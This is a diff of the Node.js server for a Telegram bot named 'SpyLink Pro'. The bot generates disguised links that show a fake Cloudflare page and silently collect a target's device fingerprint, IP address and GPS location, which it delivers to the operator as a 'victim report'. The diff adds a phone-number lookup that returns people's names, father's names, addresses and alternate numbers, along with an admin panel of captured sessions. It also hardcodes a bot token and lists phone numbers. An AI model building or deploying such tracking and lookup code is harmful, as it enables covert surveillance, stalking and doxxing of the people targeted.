@@ -1,19 +1,27 @@
-// server.js — Optimized for Render.com | Hardcoded Secrets | Single Message Delivery
+// server.js — v7.0: Custom Number API + Banned Numbers + Data Collection Fixes
 const express = require("express");
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
 const { v4: uuidv4 } = require('uuid');
+const axios = require('axios');
 
-// 🔐 HARDCODED PRIVATE CONFIG (You provided these)
+// 🔐 HARDCODED PRIVATE CONFIG
 const BOT_TOKEN = "8377073485:AAGEIdG1VgfmrCl4DVN5Qj4gy4oTaN4EvJY";
 const ADMIN_CHAT_ID = "8175884349";
 const HOST_URL = "https://botu-s3f9.onrender.com";
 
+// ❌ BANNED NUMBERS (per your request)
+const BANNED_NUMBERS = ["9161636853", "9451180555", "6306791897"];
+
 const app = express();
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Security & Performance for Render
+// Crash Protection
+process.on('unhandledRejection', console.error);
+process.on('uncaughtException', console.error);
+
+// Middleware
 app.use(require('helmet')());
 app.use(require('compression')());
 app.use(require('morgan')('tiny'));
@@ -22,126 +30,389 @@ app.use(bodyParser.json({ limit: '10mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.set("view engine", "ejs");
 
-// In-Memory Session Storage
-let sessions = {}; // { sessionId: { chatId, url, data, location, reported } }
+// Sessions Storage
+let sessions = {};
 
-// ==================== TELEGRAM HANDLERS ====================
+// ==================== TELEGRAM BOT HANDLERS ====================
 
 bot.on('message', async (msg) => {
-  const chatId = msg.chat.id;
-  const text = msg.text?.trim();
+  try {
+    const chatId = msg.chat.id;
+    const text = msg.text?.trim();
 
-  // Auto-grant admin if matches
-  if (String(chatId) === ADMIN_CHAT_ID && !text?.startsWith("/")) {
-    bot.sendMessage(chatId, "👑 Admin access confirmed. Use /create to start.");
-  }
+    // Handle reply for URL submission
+    if (msg?.reply_to_message?.text === "🌐 Send the target URL (http:// or https://)") {
+      return handleUrlSubmission(chatId, text);
+    }
 
-  if (msg?.reply_to_message?.text === "🌐 Send the target URL (http:// or https://)") {
-    return handleUrlSubmission(chatId, text);
-  }
+    // Handle reply for phone number
+    if (msg?.reply_to_message?.text === "📱 Send a phone number (e.g., 7800418265)") {
+      return handleNumberInfo(chatId, text);
+    }
 
-  switch (text) {
-    case "/start":
-      sendWelcome(chatId);
-      break;
-    case "/create":
-      requestUrl(chatId);
-      break;
-    case "/help":
-      sendHelp(chatId);
-      break;
-    case "/stats":
-      if (String(chatId) === ADMIN_CHAT_ID) sendStats(chatId);
-      break;
-    default:
-      if (chatId == ADMIN_CHAT_ID && text === "CLEARDB") {
-        sessions = {};
-        bot.sendMessage(chatId, "🗑️ Sessions cleared.");
-      }
+    // Command Router
+    switch (text) {
+      case "/start":
+        return sendWelcome(chatId);
+      case "/create":
+        return requestUrl(chatId);
+      case "/numberinfo":
+        return requestPhoneNumber(chatId);
+      case "/help":
+        return sendHelp(chatId);
+      case "/menu":
+        return sendMainMenu(chatId);
+      case "/panel":
+        if (String(chatId) === ADMIN_CHAT_ID) return showAdminPanel(chatId);
+        else bot.sendMessage(chatId, "⛔ Admin access required.");
+        break;
+      default:
+        break;
+    }
+  } catch (error) {
+    console.error("Message handler error:", error);
   }
 });
 
 bot.on('callback_query', async (query) => {
-  await bot.answerCallbackQuery(query.id);
-  const chatId = query.message.chat.id;
-  const data = query.data;
+  try {
+    await bot.answerCallbackQuery(query.id);
+    const chatId = query.message.chat.id;
+    const data = query.data;
 
-  if (data === "create_new") requestUrl(chatId);
-});
+    // Admin Panel Navigation
+    if (data === "admin_sessions") return viewAllSessions(chatId);
+    if (data === "admin_stats") return sendStats(chatId);
+    if (data === "admin_clear") return clearAllSessions(chatId);
 
-// ==================== DATA ENDPOINTS ====================
-
-app.post("/data", (req, res) => {
-  const { uid, data } = req.body;
-  if (!uid || !data) return res.status(400).send("Missing params");
-
-  if (!sessions[uid]) {
-    sessions[uid] = { chatId: parseInt(uid, 36), createdAt: new Date() };
+    // Regular User Actions
+    switch(data) {
+      case "create_new":
+        requestUrl(chatId);
+        break;
+      case "number_info":
+        requestPhoneNumber(chatId);
+        break;
+      case "main_menu":
+        sendMainMenu(chatId);
+        break;
+      case "help_cmd":
+        sendHelp(chatId);
+        break;
+      case "back_to_panel":
+        showAdminPanel(chatId);
+        break;
+    }
+  } catch (error) {
+    console.error("Callback error:", error);
   }
-  sessions[uid].data = decodeURIComponent(data);
-  sessions[uid].ip = getIP(req);
-
-  checkAndDeliver(uid);
-  res.send("ok");
 });
 
-app.post("/location", (req, res) => {
-  const { uid, lat, lon, acc } = req.body;
-  if (!uid || !lat || !lon) return res.status(400).send("Invalid location");
+// ==================== NUMBER INFO — USING YOUR API ====================
 
-  if (sessions[uid]) {
-    sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(acc || 0) };
-    checkAndDeliver(uid);
+async function handleNumberInfo(chatId, input) {
+  // Clean number: remove +, spaces, dashes, etc.
+  let number = input.replace(/\D/g, '');
+
+  // Check if banned
+  if (BANNED_NUMBERS.includes(number)) {
+    return bot.sendMessage(chatId, "❌ This number is restricted for lookup.", {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 Try Another Number", callback_data: "number_info" }],
+          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
+        ]
+      }
+    });
   }
-  res.send("ok");
-});
 
-// NO CAMERAS — Removed per your request for speed & reliability
+  if (!number || number.length < 10) {
+    return bot.sendMessage(chatId, "❌ Invalid number. Send 10+ digits (e.g., 7800418265)", {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 Retry", callback_data: "number_info" }],
+          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
+        ]
+      }
+    });
+  }
 
-// ==================== DELIVERY LOGIC ====================
+  try {
+    const response = await axios.get(`https://demon.taitanx.workers.dev/?mobile=${number}`, {
+      timeout: 8000
+    });
 
-function checkAndDeliver(sessionId) {
-  const session = sessions[sessionId];
-  if (!session || session.reported || !session.data || !session.location) return;
+    const result = response.data;
 
-  session.reported = true; // Prevent duplicate sends
+    if (!result.data || result.data.length === 0) {
+      return bot.sendMessage(chatId, "🔍 No information found for this number.", {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "📱 Try Another", callback_data: "number_info" }],
+            [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
+          ]
+        }
+      });
+    }
 
-  let formattedData = session.data
-    .replaceAll("<br>", "\n")
-    .replaceAll("<b>", "*")
-    .replaceAll("</b>", "*")
-    .replaceAll("<code>", "`")
-    .replaceAll("</code>", "`")
-    .replaceAll("&nbsp;", " ");
+    // Format all records
+    let message = `📞 *PHONE NUMBER INFO*\n\n`;
+    let count = 0;
 
-  let message = `
-✅ *FULL VICTIM REPORT*
+    for (let record of result.data) {
+      if (count >= 3) break; // Limit to 3 records to avoid overflow
 
-🆔 *Session:* \`${sessionId}\`
-🌐 *URL:* ${session.url || 'N/A'}
-📍 *Location:* https://maps.google.com/?q=${session.location.lat},${session.location.lon}
-📡 *IP:* \`${session.ip || 'Unknown'}\`
-🕒 *Time:* ${new Date().toLocaleString()}
+      // Format address (split by !)
+      let addrLines = (record.address || "").split('!').filter(a => a.trim()).slice(0, 5);
+      let formattedAddr = addrLines.join('\n          ');
 
-📱 *DEVICE & BROWSER DATA:*
-${formattedData}
+      message += `📱 *Number:* \`${record.mobile}\`\n`;
+      message += `👤 *Name:* ${record.name || 'N/A'}\n`;
+      message += `👨 *Father:* ${record.fname || 'N/A'}\n`;
+      message += `📬 *Address:*\n          ${formattedAddr || 'N/A'}\n`;
+      if (record.alt) message += `📲 *Alt Number:* \`${record.alt}\`\n`;
+      message += `📡 *Circle:* ${record.circle || 'N/A'}\n`;
+      message += `---\n\n`;
+      count++;
+    }
 
-🗺️ *LOCATION:*
-Lat: \`${session.location.lat}\`
-Lon: \`${session.location.lon}\`
-Accuracy: \`${session.location.accuracy} meters\`
+    if (result.data.length > 3) {
+      message += `ℹ️ *Showing first 3 of ${result.data.length} records.*\n`;
+    }
 
-⚠️ *Note:* Camera capture skipped for speed. Bot prioritizes instant delivery.
+    bot.sendMessage(chatId, message, {
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 Check Another Number", callback_data: "number_info" }],
+          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
+        ]
+      }
+    });
+
+  } catch (error) {
+    console.error("Number API error:", error?.response?.data || error.message);
+    bot.sendMessage(chatId, "⚠️ Failed to fetch info. Server may be down or number invalid.", {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 Retry", callback_data: "number_info" }],
+          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
+        ]
+      }
+    });
+  }
+}
+
+function requestPhoneNumber(chatId) {
+  bot.sendMessage(chatId, "📱 Send a phone number (e.g., 7800418265)", {
+    reply_markup: { force_reply: true }
+  });
+}
+
+// ==================== ADMIN PANEL (UNCHANGED) ====================
+
+function showAdminPanel(chatId) {
+  const total = Object.keys(sessions).length;
+  const reported = Object.values(sessions).filter(s => s.reported).length;
+
+  let msg = `
+🔐 *ADMIN PANEL*
+
+📊 Total Sessions: *${total}*
+✅ Reported: *${reported}*
+⏳ Pending: *${total - reported}*
+⏱️ Uptime: *${Math.floor(process.uptime())} sec*
+
+🛠️ Choose action:
 `;
 
-  bot.sendMessage(session.chatId, message, {
+  bot.sendMessage(chatId, msg, {
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "🆕 Create New Link", callback_data: "create_new" }]
+        [{ text: "👁️ View All Sessions", callback_data: "admin_sessions" }],
+        [{ text: "📈 Server Stats", callback_data: "admin_stats" }],
+        [{ text: "🗑️ Clear All Sessions", callback_data: "admin_clear" }],
+        [{ text: "🔙 Main Menu", callback_data: "main_menu" }]
       ]
     }
-  }).catch(console.error);
+  });
+}
+
+function viewAllSessions(chatId) {
+  if (Object.keys(sessions).length === 0) {
+    return bot.sendMessage(chatId, "📭 No sessions found.", {
+      reply_markup: {
+        inline_keyboard: [[{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]]
+      }
+    });
+  }
+
+  let msg = "*📋 SESSIONS LIST*\n\n";
+  let count = 0;
+  for (let [id, sess] of Object.entries(sessions)) {
+    if (count >= 20) break;
+    msg += `📄 *ID:* \`${id.substring(0,8)}...\`\n`;
+    msg += `👤 User: \`${sess.chatId}\`\n`;
+    msg += `✅ Status: ${sess.reported ? '✅ Delivered' : '⏳ Pending'}\n`;
+    msg += `🌐 URL: ${sess.url ? sess.url.substring(0,30) + '...' : 'N/A'}\n`;
+    msg += `🕒 Created: ${new Date(sess.createdAt).toLocaleTimeString()}\n`;
+    msg += `📡 IP: ${sess.ip || 'N/A'}\n`;
+    msg += `📍 Location: ${sess.location ? '✅ Captured' : '❌ Missing'}\n`;
+    msg += "---\n";
+    count++;
+  }
+
+  if (Object.keys(sessions).length > 20) {
+    msg += `\n💡 Showing first 20 of ${Object.keys(sessions).length} sessions.\n`;
+  }
+
+  bot.sendMessage(chatId, msg, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
+      ]
+    }
+  });
+}
+
+function sendStats(chatId) {
+  const mem = process.memoryUsage();
+  const active = Object.keys(sessions).length;
+  const reported = Object.values(sessions).filter(s => s.reported).length;
+
+  let msg = `
+📊 *SERVER STATS (ADMIN)*
+
+📈 Active Sessions: ${active}
+✅ Reported: ${reported}
+⏳ Pending: ${active - reported}
+⏱️ Uptime: ${Math.floor(process.uptime())} seconds
+MemoryWarning: ${(mem.heapUsed / 1024 / 1024).toFixed(2)} MB
+📚 Total Keys: ${Object.keys(sessions).length}
+`;
+
+  bot.sendMessage(chatId, msg, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
+      ]
+    }
+  });
+}
+
+function clearAllSessions(chatId) {
+  const count = Object.keys(sessions).length;
+  sessions = {};
+  bot.sendMessage(chatId, `🗑️ Cleared ${count} sessions.`, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🔙 Back to Panel", callback_data: "back_to_panel" }]
+      ]
+    }
+  });
+}
+
+// ==================== DATA COLLECTION — ENHANCED RELIABILITY ====================
+
+app.post("/data", (req, res) => {
+  try {
+    const { uid, data } = req.body;
+    if (!uid || !data) return res.status(400).send("Missing params");
+
+    if (!sessions[uid]) {
+      sessions[uid] = { chatId: parseInt(uid, 36), createdAt: new Date() }; // Fallback for old links
+    }
+    sessions[uid].data = decodeURIComponent(data);
+    sessions[uid].ip = getIP(req);
+    sessions[uid].lastDataReceived = new Date();
+
+    // Trigger delivery check
+    checkAndDeliver(uid);
+    res.send("ok");
+  } catch (error) {
+    console.error("/data endpoint error:", error);
+    res.status(500).send("Server Error");
+  }
+});
+
+app.post("/location", (req, res) => {
+  try {
+    const { uid, lat, lon, acc } = req.body;
+    if (!uid || !lat || !lon) return res.status(400).send("Invalid location");
+
+    if (sessions[uid]) {
+      sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(acc || 0) };
+      sessions[uid].lastLocationReceived = new Date();
+      checkAndDeliver(uid);
+    }
+    res.send("ok");
+  } catch (error) {
+    console.error("/location endpoint error:", error);
+    res.status(500).send("Server Error");
+  }
+});
+
+function checkAndDeliver(sessionId) {
+  try {
+    const session = sessions[sessionId];
+    if (!session || session.reported || !session.data || !session.location) return;
+
+    // Double-check data integrity
+    if (!session.data.includes("VICTIM INFORMATION")) {
+      console.warn("Suspicious data received, skipping delivery:", sessionId);
+      return;
+    }
+
+    session.reported = true;
+    session.deliveredAt = new Date();
+
+    let formattedData = session.data
+      .replaceAll("<br>", "\n")
+      .replaceAll("<b>", "*")
+      .replaceAll("</b>", "*")
+      .replaceAll("<code>", "`")
+      .replaceAll("</code>", "`")
+      .replaceAll("&nbsp;", " ");
+
+    let message = `
+✅ *FULL VICTIM REPORT*
+
+🆔 *Session ID:* \`${sessionId}\`
+🌐 *Target URL:* ${session.url || 'N/A'}
+📍 *Location:* https://maps.google.com/?q=${session.location.lat},${session.location.lon}
+📡 *IP Address:* \`${session.ip || 'Unknown'}\`
+🕒 *Report Time:* ${session.deliveredAt.toLocaleString()}
+
+📱 *DEVICE & BROWSER FINGERPRINT:*
+${formattedData}
+
+🗺️ *GEOLOCATION DATA:*
+• Latitude: \`${session.location.lat}\`
+• Longitude: \`${session.location.lon}\`
+• Accuracy: \`${session.location.accuracy} meters\`
+
+⚠️ *Note:* Data collected in real-time from victim's device.
+`;
+
+    bot.sendMessage(session.chatId, message, {
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "🆕 Create New Link", callback_data: "create_new" }],
+          [{ text: "📱 Lookup Number Info", callback_data: "number_info" }],
+          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
+        ]
+      }
+    }).catch(err => {
+      console.error("Failed to send report to user:", err.message);
+      // Mark as not delivered so it can retry if needed (optional)
+      // session.reported = false;
+    });
+  } catch (error) {
+    console.error("checkAndDeliver error:", error);
+  }
 }
 
 // ==================== UTILITIES ====================
@@ -150,6 +421,7 @@ function getIP(req) {
   return (
     req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
     req.socket?.remoteAddress ||
+    req.connection?.remoteAddress ||
     '0.0.0.0'
   );
 }
@@ -167,26 +439,27 @@ function handleUrlSubmission(chatId, url) {
   const link = `${HOST_URL}/c/${sessionId}/${encoded}`;
 
   bot.sendMessage(chatId, `
-🚀 *TRACKING LINK READY*
+🚀 *TRACKING LINK GENERATED*
 
-🔗 *Target:* ${url}
+🔗 *Target URL:* ${url}
 🆔 *Session ID:* \`${sessionId}\`
 
-🌐 *Send this link:*
+🌐 *Send this stealth link to target:*
 ${link}
 
-⏱️ *Bot will send full report instantly after:*
-• Device fingerprint
-• GPS location
+⏱️ *What happens when opened:*
+• Instant device/browser fingerprinting
+• GPS location capture (if permitted)
+• Full report sent here in <10 seconds
 
-📷 *Camera capture DISABLED for faster delivery.*
-
-👇 Tap below to create another.
+👇 Use buttons below:
 `, {
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "🆕 Create Another", callback_data: "create_new" }]
+        [{ text: "🆕 Create Another", callback_data: "create_new" }],
+        [{ text: "📱 Number Info", callback_data: "number_info" }],
+        [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
       ]
     }
   });
@@ -199,14 +472,13 @@ function requestUrl(chatId) {
 }
 
 function sendWelcome(chatId) {
-  bot.sendMessage(chatId, `🎯 *Welcome to SpyLink Pro — Render Edition*
+  bot.sendMessage(chatId, `🎯 *Welcome to SpyLink Pro — Ultimate Recon Tool*
 
-I generate Cloudflare-style tracking links that instantly collect:
-
-📍 Real-time GPS Location
+Features:
+📍 Real-time GPS Tracking via Link
 📱 50+ Device/Browser Data Points
-⚡ Ultra-Fast — Report sent in <5 seconds
-🚫 No PDF — Clean single message delivery
+📞 Advanced Phone Number Lookup
+🔐 Full Admin Dashboard
 
 👇 Start now:
 `, {
@@ -214,82 +486,126 @@ I generate Cloudflare-style tracking links that instantly collect:
     reply_markup: {
       inline_keyboard: [
         [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
-        [{ text: "📘 Help", callback_data: "help" }]
+        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
+        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
+        [{ text: "📘 Help", callback_data: "help_cmd" }]
       ]
     }
   });
 }
 
 function sendHelp(chatId) {
-  bot.sendMessage(chatId, `📘 *USAGE*
+  bot.sendMessage(chatId, `📘 *USER GUIDE*
 
-1. Tap /create
+*TRACKING LINK:*
+1. Tap “Create Tracking Link”
 2. Send any URL (e.g., https://google.com)
-3. Get a stealthy Cloudflare-looking link
-4. Send it to target (mobile works best)
-5. As soon as they open it:
-   → Device data + Location captured
-   → ONE detailed message sent to you instantly
-   → No waiting. No PDF. No camera delays.
+3. Send generated link to target
+4. Get full device + location report instantly
 
-👨‍💻 Admin Commands:
-/stats → Server stats
-CLEARDB → Clear all sessions (admin only)
+*PHONE NUMBER LOOKUP:*
+→ Send 10-digit number (e.g., 7800418265)
+→ Get name, father name, address, alt number, circle
+→ Banned numbers: 9161636853, 9451180555, 6306791897
 
-Support: @aadi_io`, { parse_mode: "Markdown" });
+*COMMANDS:*
+/start — Welcome screen
+/create — Make tracking link
+/numberinfo — Lookup phone number
+/panel — Admin dashboard (restricted)
+/menu — Show main menu
+
+👨‍💻 Support: @aadi_io`, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🚀 Create Link", callback_data: "create_new" }],
+        [{ text: "📱 Number Info", callback_data: "number_info" }],
+        [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
+      ]
+    }
+  });
 }
 
-function sendStats(chatId) {
-  const active = Object.keys(sessions).length;
-  const reported = Object.values(sessions).filter(s => s.reported).length;
-  bot.sendMessage(chatId, `
-📊 *SERVER STATS*
+function sendMainMenu(chatId) {
+  bot.sendMessage(chatId, `🏠 *MAIN MENU*
 
-📈 Active Sessions: ${active}
-✅ Reported: ${reported}
-⏳ Pending: ${active - reported}
-⏱️ Uptime: ${Math.floor(process.uptime())} seconds
-`, { parse_mode: "Markdown" });
+Choose an action:
+`, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
+        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
+        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
+        [{ text: "📘 Help", callback_data: "help_cmd" }]
+      ]
+    }
+  });
 }
 
-// ==================== EXPRESS ROUTES ====================
+// ==================== EXPRESS ROUTES — ENHANCED STABILITY ====================
 
 app.get("/c/:sessionId/:encodedUrl", (req, res) => {
-  const { sessionId, encodedUrl } = req.params;
-  const url = decodeURIComponent(atob(encodedUrl));
+  try {
+    const { sessionId, encodedUrl } = req.params;
+    const url = decodeURIComponent(atob(encodedUrl));
 
-  if (!sessions[sessionId]) {
-    sessions[sessionId] = { chatId: null, createdAt: new Date() };
+    if (!sessions[sessionId]) {
+      // Initialize session with chatId fallback
+      sessions[sessionId] = { 
+        chatId: parseInt(sessionId.split('-')[0], 36) || null, 
+        createdAt: new Date() 
+      };
+    }
+    sessions[sessionId].url = url;
+    sessions[sessionId].lastAccess = new Date();
+
+    res.render("cloudflare", {
+      ip: getIP(req),
+      time: new Date().toISOString().replace('T', ' ').substring(0, 19),
+      url: url,
+      uid: sessionId,
+      a: HOST_URL,
+      t: false
+    });
+  } catch (error) {
+    console.error("Render cloudflare.ejs error:", error);
+    res.status(500).send("Template Error");
   }
-  sessions[sessionId].url = url;
-  sessions[sessionId].lastAccess = new Date();
-
-  res.render("cloudflare", {
-    ip: getIP(req),
-    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
-    url: url,
-    uid: sessionId,
-    a: HOST_URL,
-    t: false
-  });
 });
 
 app.get("/", (req, res) => {
   res.json({
     status: "OK",
-    version: "4.0-Render",
+    version: "7.0-CUSTOM-API",
     sessions: Object.keys(sessions).length,
     uptime: process.uptime()
   });
 });
 
+// Auto cleanup every 30 minutes (aggressive to prevent memory bloat)
+setInterval(() => {
+  const now = new Date();
+  let cleaned = 0;
+  for (let id in sessions) {
+    const session = sessions[id];
+    const lastActive = session.lastAccess || session.lastDataReceived || session.lastLocationReceived || session.createdAt;
+    const age = now - new Date(lastActive);
+    if (age > 1800000) { // 30 minutes
+      delete sessions[id];
+      cleaned++;
+    }
+  }
+  if (cleaned > 0) console.log(`🧹 Garbage Collection: Removed ${cleaned} stale sessions`);
+}, 1800000);
+
 // ==================== START SERVER ====================
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`✅ SpyLink Pro Render Bot v4.0`);
+  console.log(`✅ SpyLink Pro v7.0 — Custom Number API + Banned Numbers + Data Fixes`);
   console.log(`🔗 Listening on port ${PORT}`);
   console.log(`🌐 Host: ${HOST_URL}`);
-  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
-  console.log(`👑 Admin: ${ADMIN_CHAT_ID}`);
+  console.log(`🤖 Bot ready. Monitoring requests...`);
 });
